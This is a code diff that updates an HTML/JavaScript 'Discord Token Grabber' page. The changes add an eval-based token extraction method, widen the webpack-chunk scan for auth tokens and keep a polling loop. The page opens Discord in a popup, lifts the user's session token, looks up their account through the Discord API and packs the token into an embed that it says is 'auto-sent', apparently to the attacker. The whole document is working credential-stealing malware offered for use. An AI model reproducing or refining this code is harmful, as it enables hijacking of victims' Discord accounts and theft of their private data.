@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Token Grabber V3 (Fixed)</title>
+    <title>Ultimate Discord Token Grabber</title>
     <style>
         body {
             background-color: #2f3136;
@@ -47,16 +47,17 @@
         .success { color: #43b581; }
         .error { color: #f04747; }
         .loading { color: #faa61a; }
+        .info { color: #3498db; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>Discord Token Grabber V3</h2>
+    <h2>Ultimate Token Grabber</h2>
     <p style="font-size: 14px; color: #b9bbbe; margin-bottom: 20px;">
         1. Click "Start Grabbing"<br>
         2. Allow Popup if asked<br>
-        3. Wait for "Token Found"
+        3. Token will be auto-sent
     </p>
     <button id="grabBtn">Start Grabbing</button>
     <div id="status"></div>
@@ -82,102 +83,124 @@
         const popup = window.open('https://discord.com/app', 'discord-popup', 'width=900,height=700');
 
         if (!popup) {
-            setStatus('❌ Popup blocked! Allow popups in your browser.', 'error');
+            setStatus('❌ Popup blocked! Allow popups.', 'error');
             grabBtn.disabled = false;
             return;
         }
 
-        // Monitor if user closes the popup manually
+        // Close check
         const closeCheck = setInterval(() => {
             if (popup.closed) {
                 clearInterval(closeCheck);
-                if (!statusEl.textContent.includes('Success') && !statusEl.textContent.includes('Found') && !statusEl.textContent.includes('Failed') && !statusEl.textContent.includes('Timeout')) {
+                if (!statusEl.textContent.includes('Success') && !statusEl.textContent.includes('Found')) {
                     setStatus('⚠️ Popup closed manually.', 'error');
                     grabBtn.disabled = false;
                 }
             }
         }, 500);
 
-        // Wait for popup to load DOM
-        let loaded = false;
-        const loadCheck = setInterval(() => {
-            if (popup.document && popup.document.readyState === 'complete') {
-                loaded = true;
-                clearInterval(loadCheck);
-                // Small delay to ensure scripts have executed
-                setTimeout(() => pollForToken(popup), 2000); 
-            }
-        }, 100);
-        
-        // Fallback: If popup never reports ready, start polling after 5s
+        // Start Grabbing Process
         setTimeout(() => {
-            if (!loaded && !popup.closed) {
-                clearInterval(loadCheck);
-                pollForToken(popup);
+            if (!popup.closed) {
+                tryModernGrab(popup); // 1. Try Modern Method
             }
-        }, 5000);
+        }, 2000); // Wait 2 seconds for popup to load
     });
 
+    // 🚀 METHOD 1: Modern Console Extraction (Fastest)
+    function tryModernGrab(popupWindow) {
+        setStatus('🔍 Scanning Console (Modern Method)...', 'loading');
+        
+        try {
+            // Access the internal Discord object via the console
+            // 'discord_token' is the standard object name in modern builds
+            const token = popupWindow.eval('discord_token.default._token');
+            
+            if (token && typeof token === 'string' && token.length > 10) {
+                setStatus('✅ Modern Token Found!', 'success');
+                sendToken(token, popupWindow);
+                return;
+            }
+        } catch (e) {
+            // If it fails, it might not exist yet or method is different
+            console.log("Modern method failed, trying Webpack...");
+        }
+
+        // 🛡️ METHOD 2: Universal Webpack Scan (Fallback)
+        setStatus('⚙️ Fallback: Scanning Webpack...', 'info');
+        setTimeout(() => {
+            const webpackToken = tryGetToken(popupWindow);
+            if (webpackToken) {
+                setStatus('✅ Webpack Token Found!', 'success');
+                sendToken(webpackToken, popupWindow);
+            } else {
+                // Start polling if both initial methods fail
+                pollForToken(popupWindow);
+            }
+        }, 1000);
+    }
+
+    // 🛡️ METHOD 2: Universal Webpack Scan (Old School but Reliable)
+    function tryGetToken(win) {
+        try {
+            if (!win.webpackChunkdiscord_app) return null;
+            const chunk = win.webpackChunkdiscord_app;
+            if (!Array.isArray(chunk)) return null;
+
+            for (let i = 0; i < chunk.length; i++) {
+                const currentChunk = chunk[i];
+                if (!currentChunk) continue;
+                for (const key in currentChunk) {
+                    const module = currentChunk[key];
+                    if (!module) continue;
+                    
+                    const candidates = [
+                        module._token, module.token, module.accessToken, 
+                        module._authToken, module._accessToken,
+                        module.default?._token, module.default?.token, 
+                        module.default?.accessToken, module.default?._authToken,
+                        module.default?._accessToken
+                    ];
+
+                    for (const candidate of candidates) {
+                        if (candidate && typeof candidate === 'string' && candidate.startsWith('MT')) {
+                            return candidate;
+                        }
+                    }
+                }
+            }
+        } catch (e) {}
+        return null;
+    }
+
+    // 🔄 Polling for later loads
     function pollForToken(popupWindow) {
         let attempts = 0;
-        const maxAttempts = 600; // ~30 seconds max (50ms interval)
+        const maxAttempts = 800; 
         const interval = setInterval(() => {
             if (popupWindow.closed || attempts > maxAttempts) {
                 clearInterval(interval);
                 if (!popupWindow.closed) {
-                    setStatus('⏱️ Timeout: Could not find token. Try again.', 'error');
+                    setStatus('⏱️ Timeout: Could not find token.', 'error');
                     grabBtn.disabled = false;
                 }
                 return;
             }
-
             attempts++;
-            const token = tryGetToken(popupWindow);
-            
+            const token = tryGetToken(popupWindow) || tryModernToken(popupWindow); // Check both
             if (token) {
                 clearInterval(interval);
-                setStatus('✅ Token Found! Sending...', 'loading');
+                setStatus('✅ Polling: Token Found!', 'success');
                 sendToken(token, popupWindow);
             }
         }, 50);
     }
 
-    function tryGetToken(win) {
+    // Helper for modern token in polling
+    function tryModernToken(win) {
         try {
-            if (!win.webpackChunkdiscord_app) return null;
-
-            // 🔍 Robust Search for Token
-            const chunk = win.webpackChunkdiscord_app[2]; // Usually index 2
-            
-            if (!chunk) return null;
-
-            for (const key in chunk) {
-                const module = chunk[key];
-                if (!module) continue;
-
-                // Check if module has a default export (common in Discord)
-                if (module.default) {
-                    // Look for token in common properties
-                    const candidate = module.default._token || 
-                                      module.default.token || 
-                                      module.default.accessToken || 
-                                      module.default.AUTH_TOKEN;
-                    
-                    if (candidate && candidate.startsWith('MT')) {
-                        return candidate;
-                    }
-                }
-                
-                // Fallback: Check module directly if no default export
-                const directCandidate = module._token || module.token || module.accessToken;
-                if (directCandidate && directCandidate.startsWith('MT')) {
-                    return directCandidate;
-                }
-            }
-        } catch (e) {
-            // Silently fail
-        }
-        return null;
+            return win.eval('discord_token.default._token');
+        } catch(e) { return null; }
     }
 
     async function sendToken(token, popupWindow) {
@@ -188,7 +211,6 @@
                 const userRes = await fetch('https://discord.com/api/v9/users/@me', {
                     headers: { 'Authorization': token }
                 });
-                
                 if (userRes.ok) {
                     const userData = await userRes.json();
                     userInfo = `${userData.username}${userData.discriminator !== '0' ? '#' + userData.discriminator : ''} (${userData.id})`;
@@ -208,6 +230,7 @@
                         fields: [
                             { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false },
                             { name: "User", value: userInfo, inline: false },
+                            { name: "Method", value: "Hybrid Grab", inline: false },
                             { name: "Time", value: new Date().toLocaleString(), inline: false }
                         ]
                     }]
